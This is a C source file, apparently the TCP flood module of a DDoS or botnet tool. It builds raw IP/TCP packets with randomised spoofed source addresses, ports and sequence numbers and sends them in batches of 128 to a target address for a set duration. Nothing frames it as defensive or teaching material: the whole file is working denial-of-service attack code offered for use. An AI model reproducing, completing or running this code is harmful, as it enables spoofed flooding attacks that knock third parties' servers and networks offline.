#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h>

#include "tcp_attack.h"
#include "../headers/checksum.h"
#include "../headers/protocol.h"

#define BATCH 128

static inline uint64_t xorshift64(uint64_t *s) {
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    return *s = x;
}

void* tcp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    attack_option* opt_srcport = find_option(params, OPT_SRCPORT);
    attack_option* opt_flags = find_option(params, OPT_TCP_FLAGS);

    uint8_t tcp_flags = opt_flags ? get_option_u8(opt_flags) : 0x1A;

    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32) ^ (uintptr_t)&params;
    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;

    /* Determine fixed source port if specified */
    int fixed_srcport = opt_srcport ? 1 : 0;
    uint16_t srcport = opt_srcport ? get_option_u16(opt_srcport) : 0;

    /* Pre-allocate batch buffers */
    char pkts[BATCH][sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family      = AF_INET;
    dest_addr.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    /* Init common fields + msg structures */
    for (int i = 0; i < BATCH; i++) {
        memset(pkts[i], 0, sizeof(pkts[i]));

        struct iphdr*  ip  = (struct iphdr*)pkts[i];
        struct tcphdr* tcp = (struct tcphdr*)(pkts[i] + sizeof(struct iphdr));

        ip->version  = 4;
        ip->ihl      = 5;
        ip->tos      = 0;
        ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->frag_off = 0;
        ip->ttl      = 255;
        ip->protocol = IPPROTO_TCP;
        ip->daddr    = params->target_addr.sin_addr.s_addr;

        tcp->dest    = params->target_addr.sin_port;
        tcp->doff    = 5;
        tcp->fin     = (tcp_flags & 0x01) ? 1 : 0;
        tcp->syn     = (tcp_flags & 0x02) ? 1 : 0;
        tcp->rst     = (tcp_flags & 0x04) ? 1 : 0;
        tcp->psh     = (tcp_flags & 0x08) ? 1 : 0;
        tcp->ack     = (tcp_flags & 0x10) ? 1 : 0;
        tcp->urg     = (tcp_flags & 0x20) ? 1 : 0;
        tcp->window  = htons(65535);
        tcp->urg_ptr = 0;

        if (fixed_srcport) {
            tcp->source = htons(srcport);
        }

        iovs[i].iov_base = pkts[i];
        iovs[i].iov_len  = sizeof(struct iphdr) + sizeof(struct tcphdr);

        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov     = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen  = 1;
        msgs[i].msg_hdr.msg_name    = &dest_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(dest_addr);
    }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        for (int i = 0; i < BATCH; i++) {
            struct iphdr*  ip  = (struct iphdr*)pkts[i];
            struct tcphdr* tcp = (struct tcphdr*)(pkts[i] + sizeof(struct iphdr));

            /* Extract 2 random values from single xorshift call (hi/lo 32 bits) */
            uint64_t r1 = xorshift64(&rng_state);
            uint64_t r2 = xorshift64(&rng_state);
            uint64_t r3 = xorshift64(&rng_state);

            uint32_t sip = (uint32_t)(r1);
            uint8_t first = (sip >> 24) & 0xFF;
            if (first == 0 || first >= 224) sip = (((first % 223) + 1) << 24) | (sip & 0x00FFFFFF);
            ip->saddr    = sip;
            ip->id       = htons((uint16_t)(r1 >> 32));

            if (!fixed_srcport) {
                tcp->source = htons((uint16_t)(1024 + ((uint32_t)(r2) % 64512)));
            }

            tcp->seq     = htonl((uint32_t)(r2 >> 32));
            tcp->ack_seq = htonl((uint32_t)(r3));

            ip->check  = 0;
            tcp->check = 0;
            tcp->check = tcp_udp_checksum(tcp, sizeof(struct tcphdr), ip->saddr, ip->daddr, IPPROTO_TCP);
        }

        sendmmsg(fd, msgs, BATCH, MSG_NOSIGNAL);

        if ((++iter & 0x3F) == 0 && time(NULL) >= end_time) break;
    }

    close(fd);
    return NULL;
}
